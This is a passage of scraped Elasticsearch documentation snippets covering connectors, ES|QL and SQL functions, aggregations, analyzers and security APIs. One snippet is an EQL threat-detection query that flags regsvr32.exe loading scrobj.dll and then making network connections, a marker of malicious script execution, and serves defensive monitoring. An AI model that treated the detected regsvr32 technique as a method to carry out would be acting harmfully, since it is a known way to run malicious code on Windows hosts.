\\\n--tty \\\n--rm \\\ndocker.elastic.co/integrations/elastic-connectors:9.0.0 \\\n/app/bin/elastic-ingest \\\n-c /config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Docker Run Command for Azure Blob Storage Connector\nDESCRIPTION: Command to run the Azure Blob Storage connector as a Docker container with mounted configuration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-azure-blob.md#2025-04-21_snippet_2\n\nLANGUAGE: sh\nCODE:\n```\ndocker run \\\n-v ~/connectors-config:/config \\\n--network \"elastic\" \\\n--tty \\\n--rm \\\ndocker.elastic.co/integrations/elastic-connectors:9.0.0 \\\n/app/bin/elastic-ingest \\\n-c /config/config.yml\n```\n\n----------------------------------------\n\nTITLE: ISNULL Function\nDESCRIPTION: Another two-argument variant of COALESCE for handling null values with similar functionality to IFNULL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-conditional.md#2025-04-21_snippet_6\n\nLANGUAGE: sql\nCODE:\n```\nISNULL(\n    expression,\n    expression)\n```\n\n----------------------------------------\n\nTITLE: Enabling Slow Logging for Indexing Requests in Elasticsearch\nDESCRIPTION: This snippet shows how to enable slow logging for indexing requests using the update indices settings API. It sets the warn threshold to 30 seconds for indexing operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/slow-log.md#2025-04-21_snippet_7\n\nLANGUAGE: json\nCODE:\n```\nPUT /*/_settings\n{\n  \"index.indexing.slowlog.include.user\": true,\n  \"index.indexing.slowlog.threshold.index.warn\": \"30s\"\n}\n```\n\n----------------------------------------\n\nTITLE: Max Aggregation on Histogram Fields in Elasticsearch\nDESCRIPTION: This example shows how to use Max aggregation with histogram fields. It creates an index with histogram data, adds documents, and then performs a Max aggregation on the histogram field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-max-aggregation.md#2025-04-22_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT metrics_index\n{\n  \"mappings\": {\n    \"properties\": {\n      \"latency_histo\": { \"type\": \"histogram\" }\n    }\n  }\n}\n\nPUT metrics_index/_doc/1?refresh\n{\n  \"network.name\" : \"net-1\",\n  \"latency_histo\" : {\n      \"values\" : [0.1, 0.2, 0.3, 0.4, 0.5],\n      \"counts\" : [3, 7, 23, 12, 6]\n   }\n}\n\nPUT metrics_index/_doc/2?refresh\n{\n  \"network.name\" : \"net-2\",\n  \"latency_histo\" : {\n      \"values\" :  [0.1, 0.2, 0.3, 0.4, 0.5],\n      \"counts\" : [8, 17, 8, 7, 6]\n   }\n}\n\nPOST /metrics_index/_search?size=0&filter_path=aggregations\n{\n  \"aggs\" : {\n    \"max_latency\" : { \"max\" : { \"field\" : \"latency_histo\" } }\n  }\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"aggregations\": {\n    \"max_latency\": {\n      \"value\": 0.5\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Executing EQL Sequence Query for Malicious Script Detection in Elasticsearch\nDESCRIPTION: This EQL query searches for a sequence of events indicating potential malicious script execution. It looks for a regsvr32.exe process, followed by loading of scrobj.dll, and then any network activity from the same process.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-ex-threat-detection.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nGET /my-data-stream/_eql/search\n{\n  \"query\": \"\"\"\n    sequence by process.pid\n      [process where process.name == \"regsvr32.exe\"]\n      [library where dll.name == \"scrobj.dll\"]\n      [network where true]\n  \"\"\"\n}\n```\n\n----------------------------------------\n\nTITLE: Dot Notation Field Mapping with Synthetic _source\nDESCRIPTION: Demonstrates how fields with dot notation are mapped into nested objects when using synthetic _source.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/mapping-source-field.md#2025-04-21_snippet_3\n\nLANGUAGE: json\nCODE:\n```\nPUT idx/_doc/1\n{\n  \"foo.bar.baz\": 1\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Selected Fields with EQL Search in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use the filter_path query parameter to retrieve specific fields from the _source of each matching event in an EQL search.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql.md#2025-04-21_snippet_17\n\nLANGUAGE: console\nCODE:\n```\nGET /my-data-stream/_eql/search?filter_path=hits.events._source.@timestamp,hits.events._source.process.pid\n{\n  \"query\": \"\"\"\n    process where process.name == \"regsvr32.exe\"\n  \"\"\"\n}\n```\n\n----------------------------------------\n\nTITLE: Proximity Search Query\nDESCRIPTION: Shows how to perform proximity searches that allow specified words to be in a flexible order within a maximum word distance\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-query-string-query.md#2025-04-21_snippet_6\n\nLANGUAGE: elasticsearch\nCODE:\n```\n\"fox quick\"~5\n```\n\n----------------------------------------\n\nTITLE: Adding Write Block to Elasticsearch Index\nDESCRIPTION: Example of adding a write block to an Elasticsearch index using the block API. This operation prevents write operations while still allowing metadata changes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/index-block.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001/_block/write\n```\n\n----------------------------------------\n\nTITLE: Converting Strings to Datetime in ESQL\nDESCRIPTION: This snippet demonstrates how to use the TO_DATETIME function to convert string representations of dates to datetime values. It handles ISO 8601 formatted strings and shows how to apply the function to multiple values in a row.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/to_datetime.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW string = [\"1953-09-02T00:00:00.000Z\", \"1964-06-02T00:00:00.000Z\", \"1964-06-02 00:00:00\"]\n| EVAL datetime = TO_DATETIME(string)\n```\n\n----------------------------------------\n\nTITLE: Setting Index-Level Coercion Default in Elasticsearch\nDESCRIPTION: This snippet shows how to set a global coercion default at the index level in Elasticsearch. It demonstrates disabling coercion globally while enabling it for a specific field, and includes examples of document insertions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/coerce.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"settings\": {\n    \"index.mapping.coerce\": false\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"number_one\": {\n        \"type\": \"integer\",\n        \"coerce\": true\n      },\n      \"number_two\": {\n        \"type\": \"integer\"\n      }\n    }\n  }\n}\n\nPUT my-index-000001/_doc/1\n{ \"number_one\": \"10\" }\n\nPUT my-index-000001/_doc/2\n{ \"number_two\": \"10\" }\n```\n\n----------------------------------------\n\nTITLE: Replacing Substrings Using REPLACE Function in ESQL\nDESCRIPTION: This snippet demonstrates the usage of the REPLACE function in ESQL. It replaces the word 'World' with 'Universe' in the string 'Hello World'. The function takes three parameters: the original string, the regex pattern to match, and the replacement string.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/replace.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW str = \"Hello World\"\n| EVAL str = REPLACE(str, \"World\", \"Universe\")\n| KEEP str\n```\n\n----------------------------------------\n\nTITLE: Using IS NULL/IS NOT NULL Operators in Elasticsearch SQL\nDESCRIPTION: Shows how to check for NULL or NOT NULL values in Elasticsearch SQL. This example selects records where emp_no is not null and gender is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-operators.md#2025-04-21_snippet_6\n\nLANGUAGE: sql\nCODE:\n```\nSELECT last_name l FROM \"test_emp\" WHERE emp_no IS NOT NULL AND gender IS NULL;\n```\n\n----------------------------------------\n\nTITLE: Basic Percentiles Aggregation Query\nDESCRIPTION: Basic query to calculate default percentiles (1,5,25,50,75,95,99) on a numeric field load_time.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-percentile-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET latency/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"load_time_outlier\": {\n      \"percentiles\": {\n        \"field\": \"load_time\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Post-Increment Operator with 'def' Type in Painless\nDESCRIPTION: This example illustrates how the post-increment operator '++' works with the 'def' type in Painless, showing implicit casting and type handling.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-numeric.md#2025-04-21_snippet_1\n\nLANGUAGE: painless\nCODE:\n```\ndef x = 1;\nx++;\n```\n\n----------------------------------------\n\nTITLE: Defining MonthDay Class\nDESCRIPTION: This code snippet defines the `java.time.MonthDay` class. The class represents the combination of a month and day-of-month, such as --12-24. This code lists the methods for working with just the Month and Day. Includes methods for formatting, parsing, comparing and adjusting the date.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.time.txt#2025-04-21_snippet_8\n\nLANGUAGE: Java\nCODE:\n```\n\"class java.time.MonthDay {\\n  LocalDate atYear(int)\\n  int compareTo(MonthDay)\\n  String format(DateTimeFormatter)\\n  MonthDay from(TemporalAccessor)\\n  int getMonthValue()\\n  Month getMonth()\\n  int getDayOfMonth()\\n  boolean isAfter(MonthDay)\\n  boolean isBefore(MonthDay)\\n  boolean isValidYear(int)\\n  MonthDay of(int,int)\\n  MonthDay parse(CharSequence)\\n  MonthDay parse(CharSequence,DateTimeFormatter)\\n  MonthDay with(Month)\\n  MonthDay withDayOfMonth(int)\\n  MonthDay withMonth(int)\\n}\"\n```\n\n----------------------------------------\n\nTITLE: Defining Apartment Structure in JSON\nDESCRIPTION: This snippet represents the structure of an apartment in JSON format, which will be filtered based on certain criteria. The structure includes properties like id, bedrooms, price, and address details, which are essential for the filtering process.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-sync-rules.md#2025-04-21_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\n    \"id\": 1234,\n    \"bedrooms\": 3,\n    \"price\": 1500,\n    \"address\": {\n        \"street\": \"Street 123\",\n        \"government_area\": \"Area\",\n        \"country_information\": {\n            \"country_code\": \"PT\",\n            \"country\": \"Portugal\"\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Downloading sample configuration file using curl\nDESCRIPTION: This command downloads the sample configuration file for the Elastic Connectors framework from GitHub using `curl`. The downloaded file can then be modified to configure the OneDrive connector.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-onedrive.md#2025-04-21_snippet_2\n\nLANGUAGE: sh\nCODE:\n```\ncurl https://raw.githubusercontent.com/elastic/connectors/main/config.yml.example --output ~/connectors-config/config.yml\n```\n\n----------------------------------------\n\nTITLE: CIDR Match Function in Elasticsearch\nDESCRIPTION: Evaluates if the `source_address` resides within specified CIDR blocks, such as '10.0.0.0/8'. Leverages Elasticsearch's IP range queries within a term context to perform the check.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/src/test/resources/querytranslator_tests.txt#2025-04-21_snippet_16\n\nLANGUAGE: Elasticsearch\nCODE:\n```\n{\"bool\":{\"must\":[{\"term\":{\"event.category\":{\"value\":\"process\"}}},{\"terms\":{\"source_address\":[\"10.0.0.0/8\"]}}]}}\n```\n\n----------------------------------------\n\nTITLE: Starting Elasticsearch Service\nDESCRIPTION: Command to start the Elasticsearch service after plugin installation and configuration using systemd.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-azure-classic-long.md#2025-04-21_snippet_12\n\nLANGUAGE: sh\nCODE:\n```\nsudo systemctl start elasticsearch\n```\n\n----------------------------------------\n\nTITLE: Type Compatibility Matrix Table in Markdown\nDESCRIPTION: A markdown table showing all supported type combinations for ESQL operations. Each row defines a valid type pairing between left-hand side (lhs) and right-hand side (rhs) operands that produces a boolean result.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/types/equals.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| lhs | rhs | result |\n| --- | --- | --- |\n| boolean | boolean | boolean |\n| cartesian_point | cartesian_point | boolean |\n| cartesian_shape | cartesian_shape | boolean |\n| date | date | boolean |\n| date | date_nanos | boolean |\n| date_nanos | date | boolean |\n| date_nanos | date_nanos | boolean |\n| double | double | boolean |\n| double | integer | boolean |\n| double | long | boolean |\n| geo_point | geo_point | boolean |\n| geo_shape | geo_shape | boolean |\n| integer | double | boolean |\n| integer | integer | boolean |\n| integer | long | boolean |\n| ip | ip | boolean |\n| keyword | keyword | boolean |\n| keyword | text | boolean |\n| long | double | boolean |\n| long | integer | boolean |\n| long | long | boolean |\n| text | keyword | boolean |\n| text | text | boolean |\n| unsigned_long | unsigned_long | boolean |\n| version | version | boolean |\n```\n\n----------------------------------------\n\nTITLE: ESQL SORT Command Syntax\nDESCRIPTION: Basic syntax for the SORT command showing how to sort one or more columns with optional ascending/descending order and null value handling specifications.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/sort.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nSORT column1 [ASC/DESC][NULLS FIRST/NULLS LAST][, ..., columnN [ASC/DESC][NULLS FIRST/NULLS LAST]]\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with HTML Strip Filter in Elasticsearch\nDESCRIPTION: This example demonstrates how to use the HTML strip filter with the analyze API to remove HTML tags from text and decode HTML entities.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-htmlstrip-charfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_analyze\n{\n  \"tokenizer\": \"keyword\",\n  \"char_filter\": [\n    \"html_strip\"\n  ],\n  \"text\": \"<p>I&apos;m so <b>happy</b>!</p>\"\n}\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Letter Tokenizer in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use the letter tokenizer in Elasticsearch to analyze a sample text. It sends a POST request to the _analyze endpoint with the tokenizer set to 'letter' and provides a sample text to tokenize.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-letter-tokenizer.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST _analyze\n{\n  \"tokenizer\": \"letter\",\n  \"text\": \"The 2 QUICK Brown-Foxes jumped over the lazy dog's bone.\"\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a OneDrive connector using the Elasticsearch API\nDESCRIPTION: This snippet demonstrates how to create a new self-managed OneDrive connector using the Elasticsearch Create connector API. It specifies the index name, connector name, and service type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-onedrive.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT _connector/my-onedrive-connector\n{\n  \"index_name\": \"my-elasticsearch-index\",\n  \"name\": \"Content synced from OneDrive\",\n  \"service_type\": \"onedrive\"\n}\n```\n\n----------------------------------------\n\nTITLE: Using EXP Function in ESQL to Calculate Exponential Value\nDESCRIPTION: This example demonstrates how to use the EXP function in ESQL to calculate the exponential value (e^x) of a number. It creates a row with a double value and then applies the EXP function to calculate e raised to the power of that value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/exp.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW d = 5.0\n| EVAL s = EXP(d)\n```\n\n----------------------------------------\n\nTITLE: Creating API Key for Azure Blob Storage Connector\nDESCRIPTION: API call to generate an API key with necessary permissions for the connector to operate.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-azure-blob.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /_security/api_key\n{\n  \"name\": \"connector_name-connector-api-key\",\n  \"role_descriptors\": {\n    \"connector_name-connector-role\": {\n      \"cluster\": [\n        \"monitor\",\n        \"manage_connector\"\n      ],\n      \"indices\": [\n        {\n          \"names\": [\n            \"index_name\",\n            \".search-acl-filter-index_name\",\n            \".elastic-connectors*\"\n          ],\n          \"privileges\": [\n            \"all\"\n          ],\n          \"allow_restricted_indices\": false\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Monthly Sales Sum Bucket Aggregation Response\nDESCRIPTION: Example response showing the results of a sum bucket aggregation across monthly sales data, including individual monthly buckets and the total sum.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-sum-bucket-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n   \"took\": 11,\n   \"timed_out\": false,\n   \"_shards\": ...,\n   \"hits\": ...,\n   \"aggregations\": {\n      \"sales_per_month\": {\n         \"buckets\": [\n            {\n               \"key_as_string\": \"2015/01/01 00:00:00\",\n               \"key\": 1420070400000,\n               \"doc_count\": 3,\n               \"sales\": {\n                  \"value\": 550.0\n               }\n            },\n            {\n               \"key_as_string\": \"2015/02/01 00:00:00\",\n               \"key\": 1422748800000,\n               \"doc_count\": 2,\n               \"sales\": {\n                  \"value\": 60.0\n               }\n            },\n            {\n               \"key_as_string\": \"2015/03/01 00:00:00\",\n               \"key\": 1425168000000,\n               \"doc_count\": 2,\n               \"sales\": {\n                  \"value\": 375.0\n               }\n            }\n         ]\n      },\n      \"sum_monthly_sales\": {\n          \"value\": 985.0\n      }\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Fingerprint Filter\nDESCRIPTION: Example of using the analyze API with fingerprint filter to process text input. The filter transforms 'zebra jumps over resting resting dog' into a single sorted, deduplicated token.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-fingerprint-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET _analyze\n{\n  \"tokenizer\" : \"whitespace\",\n  \"filter\" : [\"fingerprint\"],\n  \"text\" : \"zebra jumps over resting resting dog\"\n}\n```\n\n----------------------------------------\n\nTITLE: Connector Configuration YAML Example\nDESCRIPTION: Sample configuration file for setting up a PostgreSQL connector with Elasticsearch connection details and authentication\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-postgresql.md#2025-04-21_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nelasticsearch.host: http://host.docker.internal:9200\nelasticsearch.api_key: <ELASTICSEARCH_API_KEY>\n\nconnectors:\n  -\n    connector_id: <CONNECTOR_ID_FROM_KIBANA>\n    service_type: postgresql\n    api_key: <CONNECTOR_API_KEY_FROM_KIBANA>\n```\n\n----------------------------------------\n\nTITLE: Idle Transport Worker Thread Stack Trace\nDESCRIPTION: Example stack trace showing the normal state of an idle transport_worker thread in Elasticsearch, demonstrating the expected thread state and call hierarchy when waiting for network activity.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/networking-settings.md#2025-04-21_snippet_18\n\nLANGUAGE: text\nCODE:\n```\n\"elasticsearch[instance-0000000004][transport_worker][T#1]\" #32 daemon prio=5 os_prio=0 cpu=9645.94ms elapsed=501.63s tid=0x00007fb83b6307f0 nid=0x1c4 runnable  [0x00007fb7b8ffe000]\n   java.lang.Thread.State: RUNNABLE\n\tat sun.nio.ch.EPoll.wait(java.base@17.0.2/Native Method)\n\tat sun.nio.ch.EPollSelectorImpl.doSelect(java.base@17.0.2/EPollSelectorImpl.java:118)\n\tat sun.nio.ch.SelectorImpl.lockAndDoSelect(java.base@17.0.2/SelectorImpl.java:129)\n\t- locked <0x00000000c443c518> (a sun.nio.ch.Util$2)\n\t- locked <0x00000000c38f7700> (a sun.nio.ch.EPollSelectorImpl)\n\tat sun.nio.ch.SelectorImpl.select(java.base@17.0.2/SelectorImpl.java:146)\n\tat io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:813)\n\tat io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:460)\n\tat io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:986)\n\tat io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)\n\tat java.lang.Thread.run(java.base@17.0.2/Thread.java:833)\n```\n\n----------------------------------------\n\nTITLE: Defining Custom Thai Analyzer in Elasticsearch\nDESCRIPTION: This Elasticsearch configuration snippet demonstrates how to define a custom analyzer for the Thai language. It employs a Thai tokenizer and specific filter configurations, tailored for text processing in the Thai language domain, assuming Elasticsearch setup with Thai language support.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-lang-analyzer.md#2025-04-21_snippet_29\n\nLANGUAGE: console\nCODE:\n```\nPUT /thai_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"filter\": {\n        \"thai_stop\": {\n          \"type\":       \"stop\",\n          \"stopwords\":  \"_thai_\" <1>\n        }\n      },\n      \"analyzer\": {\n        \"rebuilt_thai\": {\n          \"tokenizer\":  \"thai\",\n          \"filter\": [\n            \"lowercase\",\n            \"decimal_digit\",\n            \"thai_stop\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Function Definition Header\nDESCRIPTION: Markdown header defining the TO_DOUBLE function with a reference tag\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/to_double.md#2025-04-21_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n## `TO_DOUBLE` [esql-to_double]\n```\n\n----------------------------------------\n\nTITLE: Converting Degrees to Radians using TO_RADIANS Function in ESQL\nDESCRIPTION: Uses the TO_RADIANS function to convert an array of degree values (90, 180, 270) to their equivalent radian measurements. The result shows the input degrees array and the corresponding radians array as output.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/to_radians.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW deg = [90.0, 180.0, 270.0]\n| EVAL rad = TO_RADIANS(deg)\n```\n\n----------------------------------------\n\nTITLE: Span Within Query with Elasticsearch Query DSL - Console\nDESCRIPTION: This snippet demonstrates the use of the span within query in Elasticsearch's query DSL. The purpose is to find matches within a span query constrained by another enclosing span query. The 'little' clause specifies the query for the enclosed span using span terms, while the 'big' clause defines the enclosing span with span near clauses allowing for slop and ordered matches. Inputs are span query clauses, and the expected output is the search results matching the criteria. This query works in Elasticsearch (requires an Elasticsearch instance).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-span-within-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"span_within\": {\n      \"little\": {\n        \"span_term\": { \"field1\": \"foo\" }\n      },\n      \"big\": {\n        \"span_near\": {\n          \"clauses\": [\n            { \"span_term\": { \"field1\": \"bar\" } },\n            { \"span_term\": { \"field1\": \"baz\" } }\n          ],\n          \"slop\": 5,\n          \"in_order\": true\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Pattern Matching with Triple Quote Strings in ESQL\nDESCRIPTION: Demonstrates using triple quotes for simpler escaping syntax when matching special characters. Triple quotes require only single backslash for escaping special characters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/detailedDescription/like.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nROW message = \"foo * bar\"\n| WHERE message LIKE \"\"\"foo \\* bar\"\"\"\n```\n\n----------------------------------------\n\nTITLE: Write Field Manipulation in Elasticsearch Scripts\nDESCRIPTION: Comprehensive API for modifying document fields, including setting, appending, removing, and transforming field values\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.update_by_query.txt#2025-04-21_snippet_4\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.script.field.WriteField {\n    String getName()\n    boolean exists()\n    WriteField move(def)\n    WriteField overwrite(def)\n    void remove()\n    WriteField set(def)\n    WriteField append(def)\n    boolean isEmpty()\n    int size()\n    Iterator iterator()\n    def get(def)\n    def get(int, def)\n    boolean hasValue(Predicate)\n    WriteField transform(Function)\n    WriteField deduplicate()\n    WriteField removeValuesIf(Predicate)\n    WriteField removeValue(int)\n    NestedDocument doc()\n    NestedDocument doc(int)\n    Iterable docs()\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Salesforce Connector via API\nDESCRIPTION: API endpoint for creating a new self-managed Salesforce connector in Elasticsearch. Requires specifying index name, connector name, and service type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-salesforce.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT _connector/my-salesforce-connector\n{\n  \"index_name\": \"my-elasticsearch-index\",\n  \"name\": \"Content synced from Salesforce\",\n  \"service_type\": \"salesforce\"\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating base-10 logarithm using LOG10 function in ESQL\nDESCRIPTION: This snippet demonstrates how to use the LOG10 function in ESQL to calculate the base-10 logarithm of a numeric value. It creates a row with a double value and then applies the LOG10 function to it.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/log10.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW d = 1000.0\n| EVAL s = LOG10(d)\n```\n\n----------------------------------------\n\nTITLE: Including STD_DEV Function Types\nDESCRIPTION: Includes the content of a separate file containing the types information for the STD_DEV function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/std_dev.md#2025-04-21_snippet_3\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../types/std_dev.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Read ILM Privilege\nDESCRIPTION: Read-only access for Index Lifecycle Management operations. Not available in serverless deployments\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/security-privileges.md#2025-04-21_snippet_9\n\nLANGUAGE: markdown\nCODE:\n```\nread_ilm\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Access Control Document Example\nDESCRIPTION: This code snippet demonstrates an example of Elasticsearch document. In this example, the document defines the identity of a user along with the parameters to form the access control policy.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-dls-overview.md#2025-04-21_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\n```js\n{\n  \"_id\": \"example.user@example.com\",\n  \"identity\": {\n      \"username\": \"example username\",\n      \"email\": \"example.user@example.com\"\n   },\n   \"query\": {\n        \"template\": {\n            \"params\": {\n                \"access_control\": [\n                    \"example.user@example.com\",\n                    \"example group\",\n                    \"example username\"]\n            }\n        },\n        \"source\": \"...\"\n    }\n}\n```\n```\n\n----------------------------------------\n\nTITLE: Calculating Tangent in ESQL\nDESCRIPTION: This example demonstrates how to use the TAN() function in ESQL to calculate the tangent of a numeric value. The example creates a row with a double value 1.8 and then applies the TAN function to get a result of -4.286261674628062.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/tan.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=1.8\n| EVAL tan=TAN(a)\n```\n\n----------------------------------------\n\nTITLE: Removing Ukrainian Analysis Plugin from Elasticsearch\nDESCRIPTION: Command to remove the Ukrainian analysis plugin from Elasticsearch. The node must be stopped before plugin removal.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-ukrainian.md#2025-04-21_snippet_1\n\nLANGUAGE: sh\nCODE:\n```\nsudo bin/elasticsearch-plugin remove analysis-ukrainian\n```\n\n----------------------------------------\n\nTITLE: Hunspell Analysis Results\nDESCRIPTION: Shows the token output from the Hunspell filter analysis\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-hunspell-tokenfilter.md#2025-04-21_snippet_2\n\nLANGUAGE: text\nCODE:\n```\n[ the, fox, jump, quick ]\n```\n\n----------------------------------------\n\nTITLE: First Order Derivative Example\nDESCRIPTION: Demonstrates calculating the first derivative of monthly sales totals using date histogram and sum aggregations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-derivative-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"sales_per_month\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"month\"\n      },\n      \"aggs\": {\n        \"sales\": {\n          \"sum\": {\n            \"field\": \"price\"\n          }\n        },\n        \"sales_deriv\": {\n          \"derivative\": {\n            \"buckets_path\": \"sales\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Wildcard in SELECT Statement\nDESCRIPTION: Example of using the wildcard (*) to select all columns from a table, returning all top-level fields while ignoring sub-fields.\nSOURCE: 